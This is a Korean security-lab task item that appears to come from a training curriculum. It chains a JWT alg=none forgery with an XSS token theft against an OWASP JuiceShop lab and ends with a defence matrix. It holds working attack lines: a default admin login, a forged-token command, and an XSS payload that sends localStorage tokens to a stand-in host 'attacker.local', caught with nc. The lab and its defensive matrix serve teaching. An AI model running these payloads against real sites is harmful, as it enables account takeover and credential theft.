- order: 99
  instruction: |
    [복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"

    ## 상황 (w05 → w06 시나리오 연속)

    > 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
    > JWT alg=none 변조 + XSS 가 결합되면 권한 상승 + 자격증명 탈취가 동시에 발생.
    > JuiceShop 에서 JWT 변조 PoC + XSS payload 시연 + 방어 매트릭스 정리해."

    학습 목표 (lecture #1·#2 XSS + #3 CSRF) + (lab #7·#8·#9 JWT + #6 세션 하이재킹) 통합.

    ## 임무 (3 단계, 약 35분)

    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.

    ### Phase A — JWT alg=none 변조
    1) `curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
       http://10.20.30.80/rest/user/login` 응답에서 JWT 획득.
    2) python3 으로 alg=none 변조:
       `python3 -c "import base64; h=base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode();
        print(h+'.<원본 payload>.')"`
    3) `curl -i -H "Authorization: Bearer <변조>" http://10.20.30.80/rest/user/whoami` (보통 거부 — 정상).

    ### Phase B — XSS payload + 토큰 탈취 시뮬레이션
    Payload: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`
    `nc -lk 9999 &` + 다른 터미널 `curl "http://localhost:9999/steal?t=FAKEJWT"` 자체 시뮬.

    ### Phase C — 자격증명 방어 매트릭스
    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 | key leak |
    | localStorage 탈취 | XSS | HttpOnly Cookie | CSP | XSS+CSRF chain |
    | Cookie 탈취 | XSS+Cookie | HttpOnly+Secure | SameSite=Strict | mitm |
    | Refresh token 탈취 | 영구 자격증명 | rotation+short TTL | device binding | refresh leak |
    표 끝 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh rotation" 한 줄.

    종료: echo "=== Phase A JWT ===" / "=== Phase B XSS ===" / "=== Phase C 매트릭스 ===".
  hint: |
